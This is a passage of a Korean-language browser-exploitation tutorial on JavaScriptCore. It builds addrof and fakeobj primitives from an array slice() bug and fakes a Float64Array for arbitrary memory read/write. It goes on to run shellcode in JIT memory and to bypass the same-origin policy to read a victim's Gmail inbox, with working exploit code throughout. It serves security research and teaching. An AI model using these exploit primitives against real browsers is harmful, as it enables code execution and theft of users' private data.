1. 임의의 자바스크립트 객체의 주소를 릭한다.
2. 엔진 안에 가짜 자바스크립트 객체를 삽입한다.

우리는 이 기초단계를 각각 'addrof'와 'fakeobj'라고 부를 것이다.

## 4.1 전제 조건: Int64

앞서 살펴본 것처럼, 익스플로잇 POC 에서 릭이 발생한 값은 정수가 아닌 부동 소수점 값이다. 사실 이론적으로 자바스크립트안의 모든 숫자는 64비트 부동 소수점 값[^17]이다. 각 엔진들은 성능 개선을 위해 32비트 정수 타입을 사용하고 있지만, 오버플로우 등의 이유로 더 큰 타입이 필요한 경우 이를 부동 소수점 값으로 변환한다. 따라서 자바스크립트에서 기본적으로 주어지는 숫자(primitive numbers)만 가지고는 임의의 64비트 정수(및 특정 주소)를 나타낼 수 없다.

 64비트 정수 인스턴스를 저장하도록 돕는 모듈을 구축해야 하는데, 아래와 같이 구현할 수 있다.

- 문자열, 숫자, 바이트 배열 등 다른 인자 타입을 Int64 인스턴스로 변환
- assignXXX 함수를 통해 Int64 덧셈/뺄셈 연산 결과를 기존 인스턴스에 저장 - 이러한 메소드를 사용하면 추가적인 힙 할당을 피할 수 있다.
- Add 및 Sub 함수를 통해 Int64 덧셈/뺄셈 결과를 새 인스턴스를 생성하여 저장
- 부동 소수점 값, JSValue 및 Int64 인스턴스 간의 변환 - 비트값(8 bytes hex 값)은 동일하게 유지되어야 한다.

 마지막 요점은 자세히 설명할 필요가 있다. 우리가 원하는 주소를 얻기 위해선 메모리에 double 형으로 저장되어 있는 값을 int형으로 해석되어야 한다.  이 과정에서 우리는 기존 bit 를 유지하면서 double 형 값을 int형 값으로 변환해야 한다. 이 점을 유념하여 asDouble() 을 구현하면 아래와 같을 것이다.

```C++
    double asDouble(uint64_t num)
    {
        return *(double*)&num;
    }
```

asJSValue 메소드는 NaN-boxing 프로시저를 준수하면서 주어진 비트 패턴으로 JSValue를 생성한다. 자세한 내용은 첨부된 리파지토리의 int64.js 파일을 참조하면 된다.

이제 우리의 익스플로잇 기초단계 2가지를 구축해보자.

## 4.2 addrof 와 fakeobj

JSC 는 double 배열에 값을 저장할 때 NaN-boxing 형태가 아닌 native 값의 형태로 저장하게 된다(배열이 아닐 경우 JSValue 형태로 저장한다). 이 점을 활용하여 우리는 메모리에 double 형 데이터(IndexingType ArrayWithDouble)를 집어넣었으나  엔진에서는 이 값을 처리할 때 JSValue 형(IndexingType ArrayWithContiguous)으로 간주하여 처리하게 할 수 있고, 반대의 경우도 마찬가지이다.

따라서 주소값을 릭하기 위해 필요한 단계는 다음과 같다.

1. double 형 배열을 생성한다. 이 배열은 IndexingType ArrayWithDouble로 보관된다.
2. 다음과 같은 작업을 수행할 valueOf 함수를 가진 객체를 생성한다.
	1. 이전에 만든 배열을 축소한다.
	2. 새로운 배열을 할당하고, 주소를 알고자 하는 객체를 배열에 넣는다. 이 배열은 대부분의 경우 복사된 공간에 위치하고 있기 때문에, 앞서 축소한 배열의 Butterfly의 바로 뒤에 위치할 것이다.
	3. 버그를 트리거하기 위해 축소한 배열의 크기보다 큰 값을 리턴한다.
3. 대상이 되는 배열이 slice()를 호출할때 2에서 생성된 객체를 인자값으로 사용한다.

이제 우리가 찾고자 했던 객체의 주소값이 64bit 부동소수점의 형태로 배열 내에 저장되어 있을 것이다. slice()가 IndexingType을 보존하기 때문에 새로운 배열은 데이터를 네이티브 double 형으로 취급하여 부동소수점의 형태로 표현되는 것이다. 이렇게 임의의 JSValue 인스턴스, 즉 포인터를 릭할 수 있게 되었다.


기초단계 중 하나인 fakeobj는 이와 완전히 반대 방식으로 동작한다. 여기서는 JSValue 배열에 네이티브 double 형 값을 삽입해 JSObject 포인터를 만든다.

1. 객체들의 배열을 생성한다. 이 배열은 IndexingType ArrayWithContiguous로 보관된다
2. 다음과 같은 작업을 수행할 valueOf 함수를 가진 객체를 생성한다
	1. 이전에 만든 배열을 축소한다
	2. 새로운 배열을 할당하고, JSObject 로 얻고자 하는 주소를 비트패턴이 동일하게끔 double 형으로 변환하여 배열 안에 넣는다. 이 double 형 값으로 인해 배열의 IndexingType은 ArrayWithDouble으로 변환되며, 값은 native 형태로 저장된다.
	3. 버그를 트리거하기 위해 축소한 배열의 크기보다 큰 값을 리턴한다
3. 대상이 되는 배열이 slice()를 호출할때 2에서 생성된 객체를 인자값으로 사용한다.

완전성을 위해,  2가지 기초단계의 구현을 하단에 작성해 놨다.

```javascript
    function addrof(object) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push(i + 0.1337);   // 배열의 타입이 반드시 ArrayWithDouble 여야 함

        var hax = {valueOf: function() {
            a.length = 0;
            a = [object];
            return 4;
        }};

        var b = a.slice(0, hax);
        return Int64.fromDouble(b[3]);
    }

    function fakeobj(addr) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push({});     // 배열의 타입이 반드시 ArrayWithContiguous 여야 함

        addr = addr.asDouble();
        var hax = {valueOf: function() {
            a.length = 0;
            a = [addr];
            return 4;
        }};

        return a.slice(0, hax)[3];
    }
```

## 4.3 공격 계획

이제 우리의 목표는 가짜 자바스크립트 객체를 통해 읽기 및 쓰기가 가능한 임의의 메모리를 확보하는 것이다. 이를 위해선 먼저 해결되어야 할 문제들이 있다.

- Q1. 어떤 종류의 가짜 객체를 생성하려고 하는가?
- Q2. 그런 종류의 가짜 객체를 어떻게 만들어낼 수 있을까?
- Q3. 가짜 객체를 어디에 두어야 그 객체의 주소를 알 수 있을까?

한동안 자바스크립트 엔진은 효율적으로 바이너리 데이터를 저장하기 위해 형배열`TypedArray`[^18] 을 지원했다. `TypedArray`는 자바스크립트 문자열과는 달리 스크립트에서 수정이 가능하고 데이터 포인터를 제어해  임의의 메모리에 읽기/쓰기를 할 수 있다는 장점이 있어서, 우리의 가짜 객체에 사용하기 좋다. 궁극적으로 우리의 목표는 가짜 Float64Array 인스턴스를 만드는 것이다.

Q2 와 Q3 를 위해서 JSC 의 JSObject 내부 구조에 대해 알아보자.

# 5. JSObject 시스템 이해

JavaScript 객체는 JSC 내에 다양한 C++ 클래스들의 집합으로 구현되어 있는데, 그 중심에는 JSCell 을 상속받은 JSObject 클래스가 있다(앞서 JSCell 은 가비지 컬렉터가 감시하고 있다고 언급한 바 있다). JSObject 의 하위 클래스로 배열(JSArray), 타입화된 배열(JSArrayBufferView), Proxys(JSProxy) 등이 있으며  서로 조금씩 공통점이 있다.

이제 JSC 엔진 내부에 있는 JSObject를 구성하는 여러 가지 부분에 대해 살펴볼 것이다.

## 5.1 속성 저장소 Property storage

속성은 자바스크립트 객체에서 가장 중요한 기능이다. 우리는 이미 엔진안에서 속성이 어떻게 저장되는지 살펴보았다(=Butterfly). 하지만 속성이 저장되는 또 다른 영역이 있다. JSObject는 Butterfly 외에도 메모리에서 객체 바로 다음에 위치한 인라인 보관소(기본적으로 6개의 슬롯이 있지만 런타임 분석의 영향을 받음)를 가질 수 있다. 객체에 굳이 Butterfly 가 필요가 없다면 인라인 보관소 기능은 약간의 성능 향상을 가져올 수 있다.

객체의 주소를 릭할 수 있기 때문에, 객체의 인라인 슬롯 주소 또한 알 수 있다는 점을 생각해 보자. 이 점에서 보면 인라인 슬롯은 가짜 객체를 삽입할 만한 좋은 타겟이 될 수 있다. 덧붙여, 인라인 슬롯에 가짜 객체를 놓으면 마킹된 블록 외부에 객체를 놓을 때 발생할 수 있는 문제를 피함으로써 Q3을 해결할 수 있다.

이제 Q2 만 해결하면 된다.

## 5.2  JSObject 내부

먼저 다음 JS 코드를 실행한다고 가정해 보자.

```javascript
    obj = {'a': 0x1337, 'b': false, 'c': 13.37, 'd': [1,2,3,4]};
```

객체는 아래와 같이 구성된다.

>
>    (lldb) x/6gx 0x10cd97c10
>    0x10cd97c10: 0x0100150000000136 0x0000000000000000
>    0x10cd97c20: 0xffff000000001337 0x0000000000000006
>    0x10cd97c30: 0x402bbd70a3d70a3d 0x000000010cdc7e10
>

1번째 QWORD는 JSCell이다. 2번째 QWORD는 모든 속성이 인라인으로 저장되기 때문에 null값인 Butterfly 포인터다. 3번째 QWORD는 인라인 JSValue 슬롯이다(JSValue 슬롯은 int, false, double 및 JSObject 포인터 4가지 속성을 가질 수 있다). 만약 우리가 객체에 더 많은 속성들을 추가한다면 속성들을 저장하기 위해 Butterfly가 할당될 것이다.

그렇다면 JSCell은 무엇을 포함하고 있는가? JSCell.h을 보면 다음과 같다:

> StructureID m_structureID;
> 가장 주목해야 할 부분이다, 뒤에서 깊이 있게 다룰 것이다.
> 
> IndexingType m_indexingType;
> 앞서 이 타입에 관해 설명했다. 이것은 객체 요소들을 어떤 타입으로 저장하고 있는지를 나타낸다.
> 
> JSType m_type;
> 셀의 타입을 저장한다(string, symbol, function, plain object 등).
> 
> TypeInfo::InlineTypeFlags m_flags;
> flag값은 익스플로잇에 그리 중요하지 않다. JSTypeInfo.h 에 더 자세한 정보가 나와 있다.
>
> CellState m_cellState;
> 이 변수 또한 앞서 설명했다. 가비지 컬렉터에 의해 사용된다.


## 5.3 Structures 에 대하여

JSC는 JavaScript 객체의 구조(레이아웃)을 표현하기 위해 메타 객체를 생성한다. 메타 객체는 속성 이름과 인덱스 간의 매핑을 인라인 보관소 또는 Butterfly(둘 다 JSValue 배열로 처리됨)에 저장한다.  기본적인 형태는 <속성 이름, 슬롯 인덱스> 쌍으로 이루어진 배열이지만, Linked List나 Hash Map으로도 구현될 수 있다. 모든 JSCell 인스턴스에 이 구조를 가리키는 포인터를 저장하는 대신에, 개발자들은 32비트 인덱스를  Structures 테이블에 저장하여 다른 필드를 위한 공간을 절약하기로 결정했다.

그럼 새로운 속성이 객체에 추가되는 경우 어떤 일이 벌어질까? 속성이 처음 추가되는 경우라면 새로운 Structures 인스턴스가 할당되어 기존 속성들의 슬롯 인덱스 및 추가된 속성의 인덱스를 저장할 것이다. 이 과정에서 Butterfly의 재배치가 필요할 수도 있다. 이 과정이 반복되는 걸 방지하기 위해, 기존 인스턴스의 `transition table` 이라는 자료구조 내에 새로 생성된 인스턴스를 캐싱할 수 있다. 또한 재할당을 방지하기 위해 인라인 또는 Butterfly 보관소를 추가로 할당(reallocation)하여 기존의 구조를 조정할 수 있다. 이 메커니즘을 통해 인스턴스는 재사용할 수 있게 된다. 이 과정을 이해하기 위해, 다음과 같은 JavaScript 예제 코드가 있다고 가정해 보자.

```javascript
    var o = { foo: 42 };
    if (someCondition)
        o.bar = 43;
    else
        o.baz = 44;
```

이렇게 하면 (임의의) 속성 이름과 슬롯 인덱스 맵핑이 함께 표시되는 다음과 같은 3개의 인스턴스가 생성될 수 있다.

```
+-----------------+          +-----------------+
|   Structure 1   |   +bar   |   Structure 2   |
|                 +--------->|                 |
| foo: 0          |          | foo: 0          |
+--------+--------+          | bar: 1          |
         |                   +-----------------+
         |  +baz   +-----------------+
         +-------->|   Structure 3   |
                   |                 |
                   | foo: 0          |
                   | baz: 1          |
                   +-----------------+
```

이 코드 조각들이 언제 실행되든, 새로 생성된 객체의 정확한 구조를 더 쉽게 찾을 수 있을 것이다.
오늘날 모든 주요 엔진에는 동일한 개념이 사용된다. V8은 이를 maps나 hidden classes[^19] 라고 부르고, Spidermonkey는 Shape라고 부른다.
또한 이 기술은 추측에 의존하는 JIT 컴파일러를 더 간결하게 만든다. 다음과 같은 함수를 가정해보자.

```javascript
    function foo(a) {
        return a.bar + 3;
    }
```

우리가 인터프리터 내부에서 위 함수를 몇 차례 실행한 뒤, 성능향상을 위해 그것을 네이티브 코드로 컴파일하기로 결정했다고 가정하자. 그렇다면 속성값을 검색(lookup)하기 위해서는 어떻게 처리해야 하는가? 우리는 인터프리터에게 단순 검색(lookup)을 요청할 수  있지만, 그런 방식의 동작은 많은 자원을 소모한다. 우리가 인자값으로 foo에게 주어진 객체들을 추적해 그들이 모두 같은 구조를 사용했다는 것을 알아냈다고 가정하자. 이제 다음과 같은 assembly 코드를 생성할 수 있다. 여기서 r0은 인자값을 가리킨다.

```asm
    mov r1, [r0 + #structure_id_offset];
    cmp r1, #structure_id;
    jne bailout_to_interpreter;
    mov r2, [r0 + #inline_property_offset];
```

인자값으로 들어온 객체가 올바른 structure id 를 갖는지  확인하는 절차가 코드에 들어있는데, 이는 오프셋이 컴파일 타임에 결정되어 실행되는 네이티브 언어(C언어 등)보다는 아무래도 느리다. 이 코드에서 `structure_id`와 `inline_property_offset`은 코드 내부에서 캐시되며, 이런 코드 구조를 "inline caches"라고 부른다.

속성 맵핑 외에도, Structure는 ClassInfo 인스턴스에 대한 참조도 저장한다. 이 인스턴스에는 클래스 이름("Float64Array", "HTMLParagleElement" 등등...)이 포함되며, 다음과 같은 간단한 해킹 스크립트를 통해 접근할 수 있다.

```javascript
    Object.prototype.toString.call(object);
    // "[object HTMLParagraphElement]"를 출력함
```

그러나, ClassInfo의 더 중요한 속성은 MethodTable 레퍼런스(reference)이다. MethodTable에는 C++의 vtable과 같은 함수 포인터 목록이 포함되어 있다. 대부분의 객체 관련 작업과 쓰레기 수집 관련 작업(예를 들면 참조된 모든 객체에 접근하는 작업)은 MethodTable을 통해 구현된다. 어떻게 MethodTable이 사용되는지 이해하기 위해 JsArray.cpp의 코드 중 일부를 가져왔다. 이 함수는 JavaScript 배열에 대한 ClassInfo 인스턴스 내 MethodTable 의 일부이며, 스크립트에서 ClassInfo 인스턴스의 속성이 삭제될 때마다 호출된다.[^21]

```C++
    bool JSArray::deleteProperty(JSCell* cell, ExecState* exec,
                                 PropertyName propertyName)
    {
        JSArray* thisObject = jsCast<JSArray*>(cell);

        if (propertyName == exec->propertyNames().length)
            return false;

        return JSObject::deleteProperty(thisObject, exec, propertyName);
    }
```

위 코드를 보면 deleteProperty는 배열의 .length 속성을 사용하는 특별한 경우의 수(속성값을 삭제하지 않는 경우)를 포함하고 있지만, 그 경우를 제외하고는 부모 클래스인 JSObject의 deleteProperty를 호출한다.

하단의 다이어그램은 JSC 객체 시스템을 구축하는 여러 C++ 클래스 간의 관계를 요약하고 단순화한다.

```
            +------------------------------------------+
            |                Butterfly                 |
            | baz | bar | foo | length: 2 | 42 | 13.37 |
            +------------------------------------------+
                                          ^
                                +---------+
               +----------+     |
               |          |     |
            +--+  JSCell  |     |      +-----------------+
            |  |          |     |      |                 |
            |  +----------+     |      |  MethodTable    |
            |       /\          |      |                 |
 References |       || inherits |      |  Put            |
   by ID in |  +----++----+     |      |  Get            |
  structure |  |          +-----+      |  Delete         |
      table |  | JSObject |            |  VisitChildren  |
            |  |          |<-----      |  ...            |
            |  +----------+     |      |                 |
            |       /\          |      +-----------------+
            |       || inherits |                  ^
            |  +----++----+     |                  |
            |  |          |     | associated       |
            |  | JSArray  |     | prototype        |
            |  |          |     | object           |
            |  +----------+     |                  |
            |                   |                  |
            v                   |          +-------+--------+
        +-------------------+   |          |   ClassInfo    |
        |    Structure      +---+      +-->|                |
        |                   |          |   |  Name: "Array" |
        | property: slot    |          |   |                |
        |     foo : 0       +----------+   +----------------+
        |     bar : 1       |
        |     baz : 2       |
        |                   |
        +-------------------+
```


# 6. 공격

이제 JSObject 클래스의 내부 구조에 대해 조금 알게 되었으니, 우리에게 임의의 메모리 읽기/쓰기를 제공할 Float64Array 인스턴스를 만들어보자. 가장 중요한 부분은 JSCell 헤더 내 Structure ID인데, Structure ID 와 연결된 Structure 인스턴스가 Float64Array 처럼 보이도록 메모리 조각을 만들어 엔진을 속여야 하기 때문이다. 따라서, Structure 테이블 안에 있는 Float64Array의 Structure ID를 알아야 된다.

## 6.1 Structure ID 예측하기

안타깝게도 Structure ID는 런타임에 필요할 때마다 할당되므로 정적인 것이 아니다. 또한, 엔진 실행중 생성된 Structure들의 ID는 버전에 따라 달라진다. 따라서 우리는 Float64Array 인스턴스의 Structure ID를 정확히 알 수가 없다. 하지만 어떻게든 그것을 알아내야 할 것이다.

 이 과정을 어렵게 만드는 또 하나의 문제는 임의의 Structure ID를 사용할 수 없다는 점이다. Structure 들 중에는 객체(`string`, `symbol`, 정규식 객체, `Structure`)만 있는 것이 아니라, 가비지 컬렉터에 의해 처리된 셀 또한 Structure 를 가지기 떄문이다. 그러한 셀에서 MethodTable에 참조된 아무 메소드나 호출해보면 assert에 의해 충돌이 발생할 수 있다. 그러나 이러한 Structure들은 엔진 시동 시에만 할당되며, 결과적으로 모든 Structure들은 상당히 작은 ID 값을 갖는다.

이 문제를 극복하기 위해 간단한 스프레이 기법을 사용할 것이다. Float64Array 인스턴스를 만드는 것이 전부인 Structure 수 천개를 스프레이 기법으로 뿌린 다음 초기에 생성된 ID 중 큰 값 하나를 선택하여 우리가 원하던 것을 올바르게 찾은 건지 확인할 것이다.

```javascript
    for (var i = 0; i < 0x1000; i++) {
        var a = new Float64Array(1);
        // 새로운 Structure 인스턴스를 생성하기 위해 새로운 속성을 추가한다.
        a[randomString()] = 1337;
    }
```

'instanceof'를 사용하여 올바르게 추측했는지 확인하고, 추측이 틀렸다면 다음 Structure를 확인하도록 간단히 구현되어 있다.

```javascript
    while (!(fakearray instanceof Float64Array)) {
        // 여기서 Structure ID값을 증가시킨다
    }
```

instanceof는 Structure 만을 가져오기 때문에 크래시가 발생할 확률이 적은 함수이다. 가져온 Structure에서 프로토타입을 읽어 주어진 프로토타입 객체와 포인터값을 비교하도록 구현되어 있다.

## 6.2 모든 것을 종합해 가짜 Float64Array 만들기

Float64Array는 네이티브 JSArrayBufferView 클래스에서 구현된다. 표준 JSObject 필드 외에도 이 클래스는 length, mode 필드(둘 다 32비트 정수형)와 예비기억장치(backing memory)를 가리키는 포인터(코드에서 'vector'라고 표현함)를 가진다.

우선 가짜 객체를 구성하기 위해 Float64Array 를 다른 객체(코드에서 ‘container’ 라고 표현함)의 인라인 슬롯 안에 집어 넣는다. 이 과정에서 JSValue 인코딩으로 인해 발생할 수 있는 몇가지 제약 사항이 있다.

- null은 유효한 JSValue값이 아니기 때문에 butterfly포인터 값을 null로 세팅할 수 없다. 다만 지금 작업에는 butterfly가 접근될 일이 없기 때문에 문제가 없다.
- NaN-boxing 때문에 0x00010000 보다 큰 값이 필요하므로, mode 필드에 유효한 값을 쓸 수 없다. 반면 length 필드는 자유롭게 값을 쓸 수 있다.
- JSValue 가 포함할 수 있는 유일한 포인터이기 때문에 vector는 다른 JSObject 를 가리키는 포인터여야만 한다.

위 사항 중 마지막 사항 때문에 Float64Array 의 vector 가 Uint8Array 인스턴스를 가리키게끔 구성할 것이다.

```
+----------------+                  +----------------+
|  Float64Array  |   +------------->|  Uint8Array    |
|                |   |              |                |
|  JSCell        |   |              |  JSCell        |
|  butterfly     |   |              |  butterfly     |
|  vector  ------+---+              |  vector        |
|  length        |                  |  length        |
|  mode          |                  |  mode          |
+----------------+                  +----------------+
```


이렇게 하면 두 번째 배열의 데이터 포인터를 임의의 주소값으로 세팅할 수 있다. 즉 임의의 메모리를 읽고 쓸 수 있게 된다.

아래의 코드는 앞서 보았던 익스플로잇 코드를 사용해서 가짜 Float64Array 인스턴스를 만드는 과정을 보여준다. 첨부된 익스플로잇 코드에선 임의의 메모리 영역에 읽기와 쓰기를 편하게 할 수 있도록 전역 ‘memory’ 객체를 구현했다.

```javascript
    sprayFloat64ArrayStructures();

    // 임의의 메모리 주소를 읽고 쓰기 위한 배열을 생성한다.
    var hax = new Uint8Array(0x1000);

    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,       // m_structureID, current guess
        0x0,                    // m_indexingType
        0x27,                   // m_type, Float64Array
        0x18,                   // m_flags, OverridesGetOwnPropertySlot |
            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);

    var container = {
        jsCellHeader: jsCellHeader.encodeAsJSVal(),
        butterfly: false,       // 임의의 값
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    // 가짜 Float64Array를 생성한다.
    var address = Add(addrof(container), 16);
    var fakearray = fakeobj(address);

    // 올바른 Structure ID를 찾는다.
    while (!(fakearray instanceof Float64Array)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.encodeAsJSVal();
    }

    // 모두 끝났다, 이제 fakearray는 hax 배열의 위쪽을 가리킨다
```

결과를 '시각화'하기 위해 lldb 출력값을 살펴보자. container 객체는 0x11321e1a0 주소에 위치해 있다.

```
    (lldb) x/6gx 0x11321e1a0
    0x11321e1a0: 0x0100150000001138 0x0000000000000000
    0x11321e1b0: 0x0118270000001000 0x0000000000000006
    0x11321e1c0: 0x0000000113217360 0x0001000000000010
    (lldb) p *(JSC::JSArrayBufferView*)(0x11321e1a0 + 0x10)
    (JSC::JSArrayBufferView) $0 = {
      JSC::JSNonFinalObject = {
        JSC::JSObject = {
          JSC::JSCell = {
            m_structureID = 4096
            m_indexingType = '\0'
            m_type = Float64ArrayType
            m_flags = '\x18'
            m_cellState = NewWhite
          }
          m_butterfly = {
            JSC::CopyBarrierBase = (m_value = 0x0000000000000006)
          }
        }
      }
      m_vector = {
        JSC::CopyBarrierBase = (m_value = 0x0000000113217360)
      }
      m_length = 16
      m_mode = 65536
    }
```

m_butterfly 뿐만 아니라 m_mode 또한 null 값을 쓰면 안 된다는 것을 조심해야 한다. 지금은 문제가 되지 않지만 가비지 컬렉터가 돌아가기 시작한다면 문제가 된다. 이 문제와 관련해서는 조금 뒤에 살펴보도록 하자.

## 6.3 - 쉘코드 실행하기

자바스크립트 엔진들의 공통점 중 하나는 모든 엔진들이 JIT 컴파일을 이용한다는 사실이다. 컴파일된 인스트럭션을 메모리에 쓰고 나중에 이를 실행해야 하기 때문에, JSC를 포함한 대부분의 엔진은 쓰기 및 실행이 가능한 메모리 영역을 할당한다. 이 영역은 익스플로잇에 매우 유용한 타겟이 된다. 우리가 만든 메모리 읽기/쓰기 기능을 사용해 JIT 컴파일 코드의 포인터를 릭한 다음, 거기에 셸코드를 쓰고 함수를 호출하여 우리가 작성한 코드가 실행되게 할 것이다.

아래의 코드가 위 내용을 구현한 PoC 코드이다. 하단의 코드는 runShellcode 함수와 관련되어 있다.

```javascript
    // 함수를 생성하고 여러번 호출하여 JIT 컴파일이 실행되도록 한다.
    var func = makeJITCompiledFunction();
    var funcAddr = addrof(func);
    print("[+] Shellcode function object @ " + funcAddr);

    var executableAddr = memory.readInt64(Add(funcAddr, 24));
    print("[+] Executable instance @ " + executableAddr);

    var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
    print("[+] JITCode instance @ " + jitCodeAddr);

    var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
    print("[+] RWX memory @ " + codeAddr.toString());

    print("[+] Writing shellcode...");
    memory.write(codeAddr, shellcode);

    print("[!] Jumping into shellcode...");
    func();
```

코드에서 보이는 것처럼, PoC 코드는 자바스크립트 함수 객체에서 시작하여 고정된 offset에서 객체 집합으로 이어지는 몇 개의 포인터를 읽고 릭한다. 훌륭한 코드 구조라고 볼 수는 없지만(버전이 바뀌면 offset이 변경될 수 있기 때문에) 테스트용으로는 충분하다. 

그 외에 개선해야 할 사항들이 있다. 첫 번째는 몇 가지 간단한 휴리스틱을 사용하여 유효한 포인터(가장 높은 bit들은 모두 0이고 다른 알려진 메모리 영역에 "근접"함)를 탐지하게 하는 기능이다. 두 번째는 특정 메모리 패턴에 기초하여 객체를 감지하는 기능을 구현하는 것이다. 예를 들어, JSCell을 상속하는 모든 클래스(예: ExecutableBase)는 인식 가능한 헤더로 시작한다. 또한, JIT 컴파일된 코드 자체는 익숙한 함수 프롤로그로 시작될 것이다.

iOS 10 부터 JSC 는 더이상 단일 RWX 영역을 할당하지 않는다는 점에 유의하라. 대신 같은 물리 메모리 영역에 두 개의 가상 영역을 맵핑하고 하나는 실행, 다른 하나는 쓰기 권한을 준다. 이를 우회하기 위해서 특정 버전의 memcpy 를 이용할 수 있는데, 이 특정 버전의 memcpy 는 랜덤한 주소의 메모리 영역을 할당해서 값을 쓰고는 공격자가 주소값을 직접 읽지 못하도록 --X 권한으로 맵핑한다. 이를 우회하기 위해, 익스플로잇에서 실행 가능한 영역으로 점프하기 전에 간단한 ROP 체인을 통해 memcpy 를  실행해야 할 것이다.

## 6.4 - 가비지 컬렉터에서 살아남기

익스플로잇 실행 이후에도 렌더러 프로세스를 살려두고 싶을 수 있다(어떤 경우에 이 과정이 필요한 지 뒤에서 알게 될 것이다). 익스플로잇에 성공했을지라도, 가비지 컬렉터가 실행되면 바로 크래시 화면을 맞닥뜨리게 될 것이다. 크래시가 발생하는 주된 이유는 우리가 만든 가짜 Float64Array 의 butterfly 가 유효하지 않은 포인터이지만 그렇다고 null 값도 아니기 때문에 가비지 컬렉터에 의해 접근되기 때문이다. JSObject::visitChildren 를 살펴보자

```C++
    Butterfly* butterfly = thisObject->m_butterfly.get();
    if (butterfly)
        thisObject->visitButterfly(visitor, butterfly,
                                   thisObject->structure(visitor.vm()));
```

우리의 fakearray의 butterfly 포인터를 null 포인터로 설정할 수는 있지만, 이 포인터는 container 객체의 속성인 동시에 JSObject 포인터로 취급되기 때문에 또 다른 크래시로 이어질 수 있다. 따라서 다음과 같은 조치를 취한다.

1. 빈 객체를 만든다. 이 객체의 Structure는 인라인 보관소의 기본 크기(6개의 슬롯)로 구현되지만, 그 중 어떤것도 사용되지 않는다.
2. JSCell 헤더(Structure ID 포함)를 cotainer 객체에 복사한다. 이로써 엔진은 우리의 fakearray을 구성하는 container 객체의 속성을 “잊어버리게” 된다.
3. fakearray의 butterfly 포인터를 널 포인터로 설정하고, 해당 객체의 JSCell 을 기본 Float64Array 인스턴스의 JSCell 로 바꾼다.

이 세 단계를 통해 안정적인 익스플로잇을 진행할 수 있다. 마지막 단계가 필요한 이유는, 앞서 진행한 Structure 스프레이로 인해 Float64Array 의 Structure가 엉뚱한 속성을 지니고 있을 수 있기 때문이다.

마지막으로, 프로세스가 지속되기를 바란다면 JIT 컴파일된 함수의 코드를 덮어쓸 때 반드시 유효한 JSValue 값을 리턴하도록 해야 한다. 이렇게 하지 않으면 반환값이 엔진에 의해 보관되어 다음 쓰레기 수집이 실행될 때 crash 를 발생시킬 수 있기 때문이다.

## 6.5 요약

간단히 전체 익스플로잇을 요약해 보자.

1. Float64Array Structure들을 스프레이 한다.
2. Float64Array 인스턴스를 인라인 속성 슬롯안에 넣은 채 함께 만들어질 수 있도록 인라인 속성을 가지는 container 객체를 할당한다. 높은 값의 초기 Structure ID 를 이용한다. 앞서 진행한 스프레이 과정은 Structure ID가 정확히 들어맞을 확률을 높여준다. 배열의 데이터 포인터가 Uint8Array 인스턴스를 가리키게끔 설정한다.
3. 컨테이너 객체의 주소를 릭하고, 컨테이너 객체 내부의 Float64Array 를 가리키는 fake 객체를 생성한다.
4. 추측한 structure ID 값이 정확한지 ‘instanceof’ 를 통해 확인한다. 만약 값이 틀렸다면 컨테이너 객체의 해당 속성을 새로 할당함으로써 structure ID 를 증가시킨다. Float64Array 를 얻을때까지 반복한다.
5. Uint8Array 의 데이터 포인터를 덮어씀으로써 임의의 메모리 주소를 읽고 쓴다.
6. 가비지 컬렉터에 의한 충돌을 피하기 위해 컨테이너와 Float64Array 인스턴스를 수정한다.

# 7. 렌더러 프로세스 악용하기

일반적으로 여기에서 다음 단계는 대상 시스템에 추가적인 공격을 하기 위해 일종의 sandbox escape 익스플로잇을 실행하는 것이다.

이것에 대한 내용는 이 글의 범위를 벗어나기도 하고 다른 곳에 더 좋은 내용이 있으므로, 대신 우리의 현재 상황에 대해 살펴보도록 하자.

## 7.1 WebKit 프로세스 및 권한 모델

WebKit 2 [^22] 2011년 기준 이후 WebKit 은 모든 탭에 대해 새로운 렌더러 프로세스가 생성되는 다중 프로세스 모델을 채택했다. 안정성과 성능 이유 외에도, 렌더러 프로세스가 손상되더라도 시스템에 영향을 끼치지 못하도록 하는 샌드박스 인프라의 베이스를 제공하기 위함이다.

## 7.2 동일 출처 정책

동일한 출처 정책 (SOP)은 (클라이언트 측) 웹 보안의 기반을 제공한다. 이것은 원점 A 의 콘텐츠가 다른 원점 B의 콘텐츠에 간섭하는 것을 방지한다. 이것은 네트워크 수준의 액세스(예 : XMLHttpRequests) 뿐만 아니라 스크립트 레벨의 액세스(예 : 다른 창 내부의 DOM 개체 액세스)를 포함한다. 흥미롭게도 WebKit에서 SOP를 적용하는 부분이 렌더러 프로세스 내부여서, 이 지점에서 SOP를 우회 할 수 있다. 현재 모든 주요 웹 브라우저에서도 동일하지만 크롬은 이를 사이트 격리 프로젝트 [^23] 로 바꾸려고 한다.

이 정책은 과거부터 쭉 이용되어 왔기에 전혀 새로운 내용이 아니지만 논의할 가치는 있다. 본질적으로, 이는 렌더러 프로세스가 모든 브라우저 세션에 완전히 액세스할 수 있고, 그 모든 세션에 인증 요청을 보낼 수 있고, 응답을 읽을 수 있다는 것을 의미한다. 따라서 렌더러 프로세스 공격에 성공하면 사용자의 모든 브라우저 세션에 접근할 수 있다.

데모를 위해 우리의 익스플로잇을 수정하여 사용자의 gmail 수신함을 살펴볼 것이다.

## 7.3 이메일 탈취

WebKit의 SecurityOrigin 클래스에는 m_universalAccess라는 흥미로운 필드가 있다. 이 필드가 세팅되면 모든 cross-origin checks 가 성공하게 된다. 현재 활성화 된 SecurityDomain 인스턴스에 대한 참조는 일련의 포인터를 따라 얻을 수 있다(오프셋은 Safari 버전에 따라 다름). 즉, 렌더러 프로세스에 대해 UniversalAccess 를 세팅하고 뒤이어 인증된 cross-origin XMLHttpRequests 를 수행하면 간단히 gmail 의 메일을 읽을 수 있다.

```javascript
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://mail.google.com/mail/u/0/#inbox', false);
    xhr.send();     // xhr.responseText now contains the full response
```

사용자의 gmail 수신함을 보여주는 익스플로잇의 버전이 포함된다. 원인은 알 수 없지만, 최근의 사파리 환경에서는 유효한 gmail 세션이 필요하다.


-----
